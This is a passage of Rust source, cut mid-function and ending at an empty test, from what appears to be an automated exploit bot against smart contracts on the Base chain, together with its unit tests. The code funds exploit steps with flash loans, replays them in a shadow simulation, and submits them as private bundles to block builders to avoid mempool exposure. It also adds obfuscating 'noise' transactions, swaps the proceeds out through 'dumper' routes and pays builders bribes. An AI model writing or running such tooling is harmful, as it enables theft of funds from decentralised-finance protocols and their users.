                        preflight_report.stale_priced_tokens,
                        summarize_token_deltas(&preflight_report.token_deltas)
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
                println!(
                    "[PRE-FLIGHT] Latest-state replay succeeded (initial_eth={}, final_eth={}).",
                    preflight_report.initial_eth, preflight_report.final_eth
                );
            }

            if let Err(err) = self.ensure_private_handshake().await {
                eprintln!(
                    "[-] Secure handshake failed; refusing bundle submission to avoid mempool exposure: {:?}",
                    err
                );
                feedback.outcome = AttackOutcome::DroppedHandshake;
                return feedback;
            }
            println!(
                "[EXEC] Dispatching private bundle via {} builders.",
                self.multi_builder.num_builders()
            );
            let replay_to_send_age =
                now_ms().saturating_sub(feedback.replay_completed_ms.unwrap_or(0));
            if replay_to_send_age > replay_to_send_max_ms {
                eprintln!(
                    "[FRESHNESS] Dropping stale payload before bundle dispatch (replay->send age={}ms > {}ms SLA).",
                    replay_to_send_age, replay_to_send_max_ms
                );
                feedback.outcome = AttackOutcome::DroppedStale;
                return feedback;
            }
            let current_latest_block = if let Some(head) = latest_head_block {
                head
            } else {
                match self.provider.get_block_number().await {
                    Ok(block) => block,
                    Err(primary_err) => {
                        match RobustRpc::get_block_number_with_retry_ref(&self.provider, 2).await {
                            Ok(block) => block,
                            Err(err) => {
                                eprintln!(
                                "[-] Failed to fetch latest block before dispatch: {:?} (primary={:?}). Dropping bundle.",
                                err,
                                primary_err
                            );
                                feedback.outcome = AttackOutcome::DroppedPreflight;
                                return feedback;
                            }
                        }
                    }
                }
            };
            let next_block = current_latest_block + 1;
            let max_ts = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
                Ok(d) => d.as_secs().saturating_add(120),
                Err(err) => {
                    eprintln!(
                        "[WARN] System clock invalid (before UNIX_EPOCH): {:?}. Dropping bundle submission.",
                        err
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
            };

            let bundles = mb_executor.to_bundles(next_block, &signed_txs_by_group, max_ts);
            let mut competition_rejected_any_bundle = false;
            let ranked_builders = ranked_builders_from_db();

            for (target_block, bundle) in bundles {
                if is_stale_solve(current_latest_block, target_solve_block) {
                    eprintln!(
                            "[WARN] Stale Solve dropped: latest_block={} > solve_block+1={} (solve_block={}).",
                            current_latest_block,
                            target_solve_block.saturating_add(1),
                            target_solve_block
                        );
                    feedback.outcome = AttackOutcome::DroppedStale;
                    return feedback;
                }
                match verifier::verify_call_bundle_preflight(&bundle.txs, target_block, max_ts)
                    .await
                {
                    Ok(
                        verifier::CallBundleVerdict::Skipped | verifier::CallBundleVerdict::Passed,
                    ) => {}
                    Ok(verifier::CallBundleVerdict::Failed) => {
                        eprintln!(
                            "[PRE-FLIGHT] eth_callBundle preflight returned failed verdict for block {}. Dropping bundle.",
                            target_block
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                    Err(err) => {
                        eprintln!(
                            "[PRE-FLIGHT] eth_callBundle preflight failed for block {}: {:?}. Dropping bundle.",
                            target_block,
                            err
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                }
                println!(
                    "[BUNDLE] Submitting {} txs for block {}",
                    bundle.txs.len(),
                    target_block
                );
                let submit_started = Instant::now();
                let results = self
                    .multi_builder
                    .send_bundle_ranked(&bundle, &ranked_builders)
                    .await;
                let submit_latency_ms = submit_started.elapsed().as_millis() as u64;
                if should_trigger_self_heal_on_competition(&results) {
                    competition_rejected_any_bundle = true;
                }
                let mut bundle_any_accepted = false;
                for result in results {
                    match result {
                        Ok(resp) if resp.accepted => {
                            bundle_any_accepted = true;
                            if let Some(latency_us) = resp.latency_us {
                                record_builder_latency_sample(&resp.builder, latency_us);
                            }
                            let builder_latency_ms = resp
                                .latency_us
                                .map(|us| us.saturating_div(1_000))
                                .unwrap_or(submit_latency_ms);
                            println!(
                                "[+] {} ACCEPTED bundle for block {}",
                                resp.builder, target_block
                            );
                            feedback.builder_outcomes.push(BuilderDispatchOutcome {
                                builder: resp.builder,
                                accepted: true,
                                latency_ms: builder_latency_ms,
                                rejection_class: None,
                                response_message: resp.message,
                            });
                        }
                        Ok(resp) => {
                            if let Some(latency_us) = resp.latency_us {
                                record_builder_latency_sample(&resp.builder, latency_us);
                            }
                            let builder_latency_ms = resp
                                .latency_us
                                .map(|us| us.saturating_div(1_000))
                                .unwrap_or(submit_latency_ms);
                            eprintln!("[-] {} REJECTED: {:?}", resp.builder, resp.message);
                            feedback.builder_outcomes.push(BuilderDispatchOutcome {
                                builder: resp.builder,
                                accepted: false,
                                latency_ms: builder_latency_ms,
                                rejection_class: resp
                                    .message
                                    .as_deref()
                                    .and_then(classify_rejection_class),
                                response_message: resp.message,
                            });
                        }
                        Err(e) => {
                            eprintln!("[-] Builder Error: {:?}", e);
                            feedback.builder_outcomes.push(BuilderDispatchOutcome {
                                builder: "builder_error".to_string(),
                                accepted: false,
                                latency_ms: submit_latency_ms,
                                rejection_class: classify_rejection_class(&format!("{e:?}")),
                                response_message: Some(format!("{e:?}")),
                            });
                        }
                    }
                }
                if bundle_any_accepted {
                    feedback.included = Some(true);
                } else if feedback.included.is_none() {
                    feedback.included = Some(false);
                }
            }
            feedback.send_completed_ms = Some(now_ms());

            if competition_rejected_any_bundle {
                feedback.competition_rejected = true;
                eprintln!(
                    "[SELF_HEAL] Bundle rejected due to competition signal. Scheduling next-block re-solve."
                );
            }
            if feedback.included == Some(true) {
                gas_solver::record_adaptive_feedback(gas_solver::AdaptiveBidFeedback::Won);
            } else if feedback.competition_rejected
                || builder_outcomes_have_competition_hint(&feedback.builder_outcomes)
            {
                gas_solver::record_adaptive_feedback(gas_solver::AdaptiveBidFeedback::Outbid);
            }
            feedback.outcome = AttackOutcome::Sent;
        } else {
            println!("[SIM] Shadow replay complete; no bundle submitted.");
            feedback.outcome = AttackOutcome::SimulatedOnly;
        }
        feedback
    }
}

fn build_soundness_lemma_from_shadow_failure(
    params: &ExploitParams,
    report: &verifier::ShadowSimulationReport,
) -> Option<crate::solver::soundness::SoundnessLemma> {
    let failed_index = report.failed_step?;
    let step = params.steps.get(failed_index)?;
    let reason = report
        .error
        .clone()
        .unwrap_or_else(|| "shadow replay non-success".to_string());
    let lemma_reason = format!(
        "shadow_fail step={} selector=0x{} reason={}",
        failed_index,
        hex::encode(&step.call_data[..4.min(step.call_data.len())]),
        reason
    );
    crate::solver::soundness::register_false_positive_selector(
        step.target,
        &step.call_data,
        lemma_reason,
    )
}

#[cfg(test)]
mod tests {
    use super::{
        build_dumper_swaps, build_noise_marker, build_soundness_lemma_from_shadow_failure,
        builder_outcomes_have_competition_hint, builder_routing_score, bundle_received_builders,
        collapsed_flash_loan_routes, flash_loan_discovery_key, flash_loan_discovery_tokens,
        flash_loan_required, get_dumper_router, has_coinbase_bribe_route, is_bundle_received_hint,
        is_coinbase_bribe_builder_url, is_competition_rejection_message, is_stale_solve,
        load_builder_routing_cache_ttl_ms, load_coinbase_bribe_bps, load_dumper_unwrap_to_native,
        load_flash_loan_capacity_cache_ttl_ms, load_flash_loan_discovery_cache_ttl_ms,
        load_flash_loan_discovery_v3_fees, load_gas_solver_cache_ttl_ms, noise_bundle_tx_count,
        repartition_dumper_min_out, select_flash_loan_plan,
        should_trigger_self_heal_on_competition, u256_to_u128_saturating, DumperSwap,
        MAX_NOISE_TXS_PER_BUNDLE,
    };
    use crate::executor::builders::BundleResponse;
    use crate::executor::verifier::ShadowSimulationReport;
    use crate::executor::BuilderDispatchOutcome;
    use crate::solver::objectives::{ExploitParams, ExploitStep, FlashLoanLeg};
    use alloy::primitives::{Address, Bytes, U256};
    use std::str::FromStr;
    use std::sync::Mutex;

    static ENV_LOCK: Mutex<()> = Mutex::new(());

    #[test]
    fn test_u256_to_u128_saturating_bounds() {
        assert_eq!(u256_to_u128_saturating(U256::from(42u64)), 42u128);
        assert_eq!(u256_to_u128_saturating(U256::from(u128::MAX)), u128::MAX);
        let overflow = U256::from(u128::MAX).saturating_add(U256::from(1u64));
        assert_eq!(u256_to_u128_saturating(overflow), u128::MAX);
    }

    #[test]
    fn test_bundle_received_hint_detection() {
        assert!(is_bundle_received_hint("Bundle Received"));
        assert!(is_bundle_received_hint("{\"result\":\"bundle received\"}"));
        assert!(!is_bundle_received_hint("accepted"));
    }

    #[test]
    fn test_builder_outcomes_competition_hint_is_any_message_match() {
        let outcomes = vec![
            BuilderDispatchOutcome {
                builder: "A".to_string(),
                accepted: true,
                latency_ms: 10,
                rejection_class: None,
                response_message: Some("ok".to_string()),
            },
            BuilderDispatchOutcome {
                builder: "B".to_string(),
                accepted: false,
                latency_ms: 10,
                rejection_class: Some("outbid".to_string()),
                response_message: Some("bundle already imported".to_string()),
            },
        ];
        assert!(builder_outcomes_have_competition_hint(&outcomes));
    }

    #[test]
    fn test_bundle_received_builders_extracts_names() {
        let outcomes = vec![
            BuilderDispatchOutcome {
                builder: "BeaverBuild".to_string(),
                accepted: true,
                latency_ms: 10,
                rejection_class: None,
                response_message: Some("{\"result\":\"Bundle Received\"}".to_string()),
            },
            BuilderDispatchOutcome {
                builder: "Titan".to_string(),
                accepted: true,
                latency_ms: 10,
                rejection_class: None,
                response_message: Some("{\"result\":\"ok\"}".to_string()),
            },
        ];
        assert_eq!(
            bundle_received_builders(&outcomes),
            vec!["BeaverBuild".to_string()]
        );
    }

    #[test]
    fn test_shadow_failure_generates_soundness_lemma() {
        crate::solver::soundness::clear_false_positive_lemmas();

        let step = ExploitStep {
            target: Address::from([0x44; 20]),
            call_data: Bytes::from_static(&[0xde, 0xad, 0xbe, 0xef, 0x01]),
            execute_if: None,
        };
        let params = ExploitParams {
            flash_loan_amount: U256::ZERO,
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::new(),
            steps: vec![step.clone()],
            expected_profit: None,
            block_offsets: None,
        };
        let report = ShadowSimulationReport {
            success: false,
            profitable: false,
            estimated_gas: 0,
            failed_step: Some(0),
            failure_gas_used: None,
            failure_gas_limit: None,
            halt_reason: None,
            initial_eth: revm::primitives::U256::ZERO,
            final_eth: revm::primitives::U256::ZERO,
            token_deltas: Vec::new(),
            initial_value_wei: revm::primitives::U256::ZERO,
            final_value_wei: revm::primitives::U256::ZERO,
            gas_cost_wei: revm::primitives::U256::ZERO,
            priced_tokens: 0,
            unpriced_tokens: 0,
            stale_priced_tokens: 0,
            error: Some("non-success execution result: Revert".to_string()),
        };

        let lemma = build_soundness_lemma_from_shadow_failure(&params, &report)
            .expect("lemma must be generated for failed step");
        assert_eq!(lemma.contract, step.target);
        assert_eq!(lemma.selector, [0xde, 0xad, 0xbe, 0xef]);
        assert!(crate::solver::soundness::is_selector_blocked(
            step.target,
            &step.call_data
        ));
    }

    #[test]
    fn test_shadow_failure_without_failed_step_does_not_learn_lemma() {
        crate::solver::soundness::clear_false_positive_lemmas();

        let step = ExploitStep {
            target: Address::from([0x55; 20]),
            call_data: Bytes::from_static(&[0xde, 0xad, 0xbe, 0xef]),
            execute_if: None,
        };
        let params = ExploitParams {
            flash_loan_amount: U256::ZERO,
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::new(),
            steps: vec![step.clone()],
            expected_profit: None,
            block_offsets: None,
        };
        let report = ShadowSimulationReport {
            success: false,
            profitable: false,
            estimated_gas: 0,
            failed_step: None,
            failure_gas_used: None,
            failure_gas_limit: None,
            halt_reason: None,
            initial_eth: revm::primitives::U256::ZERO,
            final_eth: revm::primitives::U256::ZERO,
            token_deltas: Vec::new(),
            initial_value_wei: revm::primitives::U256::ZERO,
            final_value_wei: revm::primitives::U256::ZERO,
            gas_cost_wei: revm::primitives::U256::ZERO,
            priced_tokens: 0,
            unpriced_tokens: 0,
            stale_priced_tokens: 0,
            error: Some("non-success execution result: Revert".to_string()),
        };

        let lemma = build_soundness_lemma_from_shadow_failure(&params, &report);
        assert!(lemma.is_none());
        assert!(!crate::solver::soundness::is_selector_blocked(
            step.target,
            &step.call_data
        ));
    }

    #[test]
    fn test_noise_bundle_tx_count_is_obfuscation_grade() {
        let n = noise_bundle_tx_count();
        assert!(
            (0..=MAX_NOISE_TXS_PER_BUNDLE).contains(&n),
            "noise tx count must stay in [0, {MAX_NOISE_TXS_PER_BUNDLE}]"
        );
    }

    #[test]
    fn test_noise_markers_are_deterministic_and_distinct() {
        let a = build_noise_marker(0, 0, 42);
        let b = build_noise_marker(0, 1, 42);
        let c = build_noise_marker(1, 0, 42);
        assert_ne!(a, b);
        assert_ne!(a, c);
        assert_eq!(a, build_noise_marker(0, 0, 42));
    }

    #[test]
    fn test_builder_routing_cache_ttl_bounds() {
        let key = "BUILDER_ROUTING_CACHE_TTL_MS";
        let old = std::env::var(key).ok();

        std::env::set_var(key, "1");
        assert_eq!(load_builder_routing_cache_ttl_ms(), 250);

        std::env::set_var(key, "999999");
        assert_eq!(load_builder_routing_cache_ttl_ms(), 120_000);

        std::env::set_var(key, "5000");
        assert_eq!(load_builder_routing_cache_ttl_ms(), 5_000);

        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_builder_routing_score_prefers_reliable_low_outbid_low_latency() {
        let strong = crate::storage::contracts_db::BuilderRoutingStats {
            builder: "strong".to_string(),
            attempts: 100,
            accepted: 90,
            outbid_rejections: 5,
            avg_latency_ms: 80.0,
        };
        let weak = crate::storage::contracts_db::BuilderRoutingStats {
            builder: "weak".to_string(),
            attempts: 100,
            accepted: 70,
            outbid_rejections: 20,
            avg_latency_ms: 80.0,
        };
        assert!(builder_routing_score(&strong) > builder_routing_score(&weak));
    }

    #[test]
    fn test_builder_routing_score_handles_non_finite_latency() {
        let finite = crate::storage::contracts_db::BuilderRoutingStats {
            builder: "finite".to_string(),
            attempts: 10,
            accepted: 7,
            outbid_rejections: 1,
            avg_latency_ms: 100.0,
        };
        let nan_latency = crate::storage::contracts_db::BuilderRoutingStats {
            builder: "nan".to_string(),
            attempts: 10,
            accepted: 7,
            outbid_rejections: 1,
            avg_latency_ms: f64::NAN,
        };
        // Non-finite latency must not panic or destabilize scoring.
        let _ = builder_routing_score(&finite);
        let _ = builder_routing_score(&nan_latency);
    }

    #[test]
    fn test_gas_solver_cache_ttl_bounds() {
        let key = "GAS_SOLVER_CACHE_TTL_MS";
        let old = std::env::var(key).ok();

        std::env::set_var(key, "1");
        assert_eq!(load_gas_solver_cache_ttl_ms(), 100);

        std::env::set_var(key, "999999");
        assert_eq!(load_gas_solver_cache_ttl_ms(), 30_000);

        std::env::set_var(key, "2500");
        assert_eq!(load_gas_solver_cache_ttl_ms(), 2_500);

        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_competition_rejection_message_detection() {
        assert!(is_competition_rejection_message(
            "replacement transaction underpriced"
        ));
        assert!(is_competition_rejection_message("bundle already imported"));
        assert!(!is_competition_rejection_message(
            "simulation reverted at step 0"
        ));
    }

    #[test]
    fn test_self_heal_trigger_on_full_competition_reject() {
        let results = vec![
            Ok(BundleResponse {
                builder: "b1".to_string(),
                accepted: false,
                message: Some("nonce too low".to_string()),
                latency_us: None,
            }),
            Ok(BundleResponse {
                builder: "b2".to_string(),
                accepted: false,
                message: Some("bundle already imported".to_string()),
                latency_us: None,
            }),
        ];
        assert!(should_trigger_self_heal_on_competition(&results));
    }

    #[test]
    fn test_self_heal_not_triggered_when_any_builder_accepts() {
        let results = vec![
            Ok(BundleResponse {
                builder: "b1".to_string(),
                accepted: true,
                message: Some("ok".to_string()),
                latency_us: None,
            }),
            Ok(BundleResponse {
                builder: "b2".to_string(),
                accepted: false,
                message: Some("underpriced".to_string()),
                latency_us: None,
            }),
        ];
        assert!(!should_trigger_self_heal_on_competition(&results));
    }

    #[test]
    fn test_block_liveness_gate_detects_stale_solve() {
        assert!(is_stale_solve(102, 100));
        assert!(is_stale_solve(150, 100));
    }

    #[test]
    fn test_block_liveness_gate_allows_next_block_window() {
        assert!(!is_stale_solve(100, 100));
        assert!(!is_stale_solve(101, 100));
    }

    #[test]
    fn test_dumper_router_exists_for_supported_chain() {
        let base = get_dumper_router(8453);
        assert!(
            base.is_some(),
            "base chain must have a configured dumper router"
        );
    }

    #[test]
    fn test_build_dumper_swaps_partitions_gas_min_out_across_tokens() {
        let chain = crate::config::chains::ChainConfig::base();
        let deltas = vec![
            crate::executor::verifier::TokenBalanceDelta {
                token: chain.weth,
                initial: revm::primitives::U256::from(1u64),
                final_balance: revm::primitives::U256::from(2u64),
            },
            crate::executor::verifier::TokenBalanceDelta {
                token: chain.usdc,
                initial: revm::primitives::U256::from(10u64),
                final_balance: revm::primitives::U256::from(30u64),
            },
            crate::executor::verifier::TokenBalanceDelta {
                token: Address::from([0x31; 20]),
                initial: revm::primitives::U256::from(2u64),
                final_balance: revm::primitives::U256::from(7u64),
            },
        ];

        let gas_cost = revm::primitives::U256::from(9u64);
        let swaps = build_dumper_swaps(chain.chain_id, &deltas, gas_cost);
        assert_eq!(swaps.len(), 2, "weth delta must not produce dump swaps");

        let sum_min_out = swaps
            .iter()
            .fold(U256::ZERO, |acc, swap| acc.saturating_add(swap.min_out_wei));
        assert_eq!(sum_min_out, U256::from(9u64));
    }

    #[test]
    fn test_repartition_dumper_min_out_sets_exact_required_total() {
        let mut swaps = vec![
            DumperSwap {
                token: Address::from([0x11; 20]),
                amount_in: U256::from(1u64),
                min_out_wei: U256::ZERO,
            },
            DumperSwap {
                token: Address::from([0x12; 20]),
                amount_in: U256::from(2u64),
                min_out_wei: U256::ZERO,
            },
            DumperSwap {
                token: Address::from([0x13; 20]),
                amount_in: U256::from(3u64),
                min_out_wei: U256::ZERO,
            },
        ];
        repartition_dumper_min_out(&mut swaps, U256::from(10u64));
        let sum = swaps
            .iter()
            .fold(U256::ZERO, |acc, swap| acc.saturating_add(swap.min_out_wei));
        assert_eq!(sum, U256::from(10u64));
        assert_eq!(swaps[0].min_out_wei, U256::from(3u64));
        assert_eq!(swaps[1].min_out_wei, U256::from(3u64));
        assert_eq!(swaps[2].min_out_wei, U256::from(4u64));
    }

    #[test]
    fn test_flash_loan_required_detects_all_trigger_inputs() {
        let base = ExploitParams {
            flash_loan_amount: U256::ZERO,
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::new(),
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        assert!(!flash_loan_required(&base));

        let mut with_amount = base.clone();
        with_amount.flash_loan_amount = U256::from(1u64);
        assert!(flash_loan_required(&with_amount));

        let mut with_provider = base.clone();
        with_provider.flash_loan_provider = Address::from([0x55; 20]);
        assert!(flash_loan_required(&with_provider));

        let mut with_leg = base;
        with_leg.flash_loan_legs = vec![FlashLoanLeg {
            provider: Address::from([0x66; 20]),
            token: Address::from([0x77; 20]),
            amount: U256::from(3u64),
            fee_bps: 9,
        }];
        assert!(flash_loan_required(&with_leg));
    }

    #[test]
    fn test_flash_loan_discovery_tokens_are_deduped_and_non_weth() {
        let chain = crate::config::chains::ChainConfig::base();
        let params = ExploitParams {
            flash_loan_amount: U256::from(1u64),
            flash_loan_token: chain.usdc,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: vec![
                FlashLoanLeg {
                    provider: Address::from([0x41; 20]),
                    token: chain.usdc,
                    amount: U256::from(2u64),
                    fee_bps: 9,
                },
                FlashLoanLeg {
                    provider: Address::from([0x42; 20]),
                    token: chain.weth,
                    amount: U256::from(3u64),
                    fee_bps: 9,
                },
            ],
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        let tokens = flash_loan_discovery_tokens(chain.chain_id, &params);
        assert!(
            tokens.contains(&chain.usdc),
            "requested/leg token must be considered for discovery"
        );
        assert!(
            !tokens.contains(&chain.weth),
            "weth must be excluded from token side of token<->weth pool discovery"
        );
        let usdc_count = tokens.iter().filter(|token| **token == chain.usdc).count();
        assert_eq!(usdc_count, 1, "token candidates must be deduplicated");
    }

    #[test]
    fn test_flash_loan_discovery_v3_fees_env_is_deduped_and_filtered() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "FLASH_LOAN_DISCOVERY_V3_FEES";
        let old = std::env::var(key).ok();
        std::env::set_var(key, "3000,500,3000,0,200000,10000");
        let fees = load_flash_loan_discovery_v3_fees();
        assert_eq!(fees, vec![500, 3000, 10000]);
        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_flash_loan_discovery_cache_ttl_bounds() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "FLASH_LOAN_DISCOVERY_CACHE_TTL_MS";
        let old = std::env::var(key).ok();
        std::env::set_var(key, "1");
        assert_eq!(load_flash_loan_discovery_cache_ttl_ms(), 250);
        std::env::set_var(key, "999999999");
        assert_eq!(load_flash_loan_discovery_cache_ttl_ms(), 300_000);
        std::env::set_var(key, "1500");
        assert_eq!(load_flash_loan_discovery_cache_ttl_ms(), 1_500);
        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_flash_loan_capacity_cache_ttl_bounds() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "FLASH_LOAN_CAPACITY_CACHE_TTL_MS";
        let old = std::env::var(key).ok();
        std::env::set_var(key, "1");
        assert_eq!(load_flash_loan_capacity_cache_ttl_ms(), 100);
        std::env::set_var(key, "999999999");
        assert_eq!(load_flash_loan_capacity_cache_ttl_ms(), 60_000);
        std::env::set_var(key, "1200");
        assert_eq!(load_flash_loan_capacity_cache_ttl_ms(), 1_200);
        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_flash_loan_discovery_key_is_deterministic_for_same_token_set() {
        let t1 = Address::from([0x11; 20]);
        let t2 = Address::from([0x22; 20]);
        let key_a = flash_loan_discovery_key(8453, &[t1, t2]);
        let key_b = flash_loan_discovery_key(8453, &[t1, t2]);
        assert_eq!(key_a, key_b);
        let key_c = flash_loan_discovery_key(8453, &[t2, t1]);
        assert_ne!(
            key_a, key_c,
            "ordering is part of canonicalized token set key"
        );
    }

    #[test]
    fn test_select_flash_loan_plan_falls_back_to_cheapest_provider() {
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        let params = ExploitParams {
            flash_loan_amount: U256::from(1_000u64),
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::new(),
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        let plan = select_flash_loan_plan(8453, &providers, &params)
            .expect("non-zero flash-loan amount should produce execution plan");
        let expected = Address::from_str("BA12222222228d8Ba445958a75a0704d566BF2C8")
            .expect("valid balancer address literal");
        assert_eq!(
            plan.provider, expected,
            "base balancer vault should be the default cheapest provider"
        );
    }

    #[test]
    fn test_select_flash_loan_plan_prefers_explicit_valid_provider() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        let explicit = Address::from_str("A238Dd80C259a72e81d7e4664a9801593F98d1c5")
            .expect("valid aave address literal");
        let params = ExploitParams {
            flash_loan_amount: U256::from(50u64),
            flash_loan_token: Address::ZERO,
            flash_loan_provider: explicit,
            flash_loan_legs: Vec::new(),
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        let plan = select_flash_loan_plan(8453, &providers, &params)
            .expect("explicit valid provider should be selected");
        assert_eq!(plan.provider, explicit);
    }

    #[test]
    fn test_select_flash_loan_plan_uses_requested_token_for_fallback() {
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        let chain = crate::config::chains::ChainConfig::base();
        let params = ExploitParams {
            flash_loan_amount: U256::from(1_000u64),
            flash_loan_token: chain.usdc,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::new(),
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        let plan = select_flash_loan_plan(8453, &providers, &params)
            .expect("fallback plan should be constructed for non-zero amount");
        assert_eq!(plan.token, chain.usdc);
    }

    #[test]
    fn test_select_flash_loan_plan_skips_incompatible_registry_provider() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        std::env::set_var(
            "FLASH_LOAN_PROVIDER_SPECS_8453",
            "uniswap_v2_pair:0x0000000000000000000000000000000000000123:0x0000000000000000000000000000000000000456:0x0000000000000000000000000000000000000789:0",
        );
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        std::env::remove_var("FLASH_LOAN_PROVIDER_SPECS_8453");

        let chain = crate::config::chains::ChainConfig::base();
        let params = ExploitParams {
            flash_loan_amount: U256::from(2_000u64),
            flash_loan_token: chain.usdc,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::new(),
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };

        let plan = select_flash_loan_plan(8453, &providers, &params)
            .expect("compatible provider should be selected after skipping incompatible pair");
        let balancer = Address::from_str("BA12222222228d8Ba445958a75a0704d566BF2C8")
            .expect("valid balancer address literal");
        assert_eq!(plan.provider, balancer);
        assert_eq!(plan.token, chain.usdc);
    }

    #[test]
    fn test_select_flash_loan_plan_uses_leg_amount_for_explicit_provider() {
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        let explicit = Address::from_str("A238Dd80C259a72e81d7e4664a9801593F98d1c5")
            .expect("valid aave address literal");
        let params = ExploitParams {
            flash_loan_amount: U256::from(10_000u64),
            flash_loan_token: Address::ZERO,
            flash_loan_provider: explicit,
            flash_loan_legs: vec![
                FlashLoanLeg {
                    provider: explicit,
                    token: Address::ZERO,
                    amount: U256::from(2_000u64),
                    fee_bps: 9,
                },
                FlashLoanLeg {
                    provider: explicit,
                    token: Address::ZERO,
                    amount: U256::from(3_000u64),
                    fee_bps: 9,
                },
            ],
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };

        let plan = select_flash_loan_plan(8453, &providers, &params)
            .expect("explicit provider should use compatible leg amount when legs exist");
        assert_eq!(plan.provider, explicit);
        assert_eq!(plan.amount, U256::from(5_000u64));
    }

    #[test]
    fn test_select_flash_loan_plan_uses_legs_when_total_amount_is_zero() {
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        let balancer = Address::from_str("BA12222222228d8Ba445958a75a0704d566BF2C8")
            .expect("valid balancer address literal");
        let params = ExploitParams {
            flash_loan_amount: U256::ZERO,
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: vec![
                FlashLoanLeg {
                    provider: balancer,
                    token: Address::ZERO,
                    amount: U256::from(1_500u64),
                    fee_bps: 0,
                },
                FlashLoanLeg {
                    provider: balancer,
                    token: Address::ZERO,
                    amount: U256::from(500u64),
                    fee_bps: 0,
                },
            ],
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };

        let plan = select_flash_loan_plan(8453, &providers, &params)
            .expect("non-empty legs should drive plan selection even when total amount is zero");
        assert_eq!(plan.provider, balancer);
        assert_eq!(plan.amount, U256::from(2_000u64));
    }

    #[test]
    fn test_collapsed_flash_loan_routes_coalesces_same_provider_and_token() {
        let chain = crate::config::chains::ChainConfig::base();
        let provider = Address::from_str("A238Dd80C259a72e81d7e4664a9801593F98d1c5")
            .expect("valid aave address literal");
        let params = ExploitParams {
            flash_loan_amount: U256::from(5_000u64),
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: vec![
                FlashLoanLeg {
                    provider,
                    token: Address::ZERO,
                    amount: U256::from(1_000u64),
                    fee_bps: 9,
                },
                FlashLoanLeg {
                    provider,
                    token: chain.weth,
                    amount: U256::from(2_000u64),
                    fee_bps: 9,
                },
                FlashLoanLeg {
                    provider,
                    token: chain.weth,
                    amount: U256::from(3_000u64),
                    fee_bps: 9,
                },
            ],
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        let routes = collapsed_flash_loan_routes(chain.weth, &params);
        assert_eq!(routes.len(), 1);
        assert_eq!(routes[0].provider, provider);
        assert_eq!(routes[0].token, chain.weth);
        assert_eq!(routes[0].amount, U256::from(6_000u64));
    }

    #[test]
    fn test_select_flash_loan_plan_rejects_multi_route_legs() {
        let providers = crate::protocols::flash_loan::get_default_providers(8453);
        let balancer = Address::from_str("BA12222222228d8Ba445958a75a0704d566BF2C8")
            .expect("valid balancer address literal");
        let aave = Address::from_str("A238Dd80C259a72e81d7e4664a9801593F98d1c5")
            .expect("valid aave address literal");
        let chain = crate::config::chains::ChainConfig::base();
        let params = ExploitParams {
            flash_loan_amount: U256::from(5_000u64),
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: vec![
                FlashLoanLeg {
                    provider: balancer,
                    token: chain.weth,
                    amount: U256::from(3_000u64),
                    fee_bps: 0,
                },
                FlashLoanLeg {
                    provider: aave,
                    token: chain.weth,
                    amount: U256::from(2_000u64),
                    fee_bps: 9,
                },
            ],
            steps: vec![],
            expected_profit: None,
            block_offsets: None,
        };
        assert!(
            select_flash_loan_plan(8453, &providers, &params).is_none(),
            "executor must fail-closed on multi-route flash-loan leg requirements"
        );
    }

    #[test]
    fn test_coinbase_bribe_bps_env_is_clamped() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "COINBASE_BRIBE_BPS";
        let old = std::env::var(key).ok();

        std::env::set_var(key, "0");
        assert_eq!(load_coinbase_bribe_bps(), 1);
        std::env::set_var(key, "100000");
        assert_eq!(load_coinbase_bribe_bps(), 9_999);
        std::env::set_var(key, "5000");
        assert_eq!(load_coinbase_bribe_bps(), 5_000);

        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
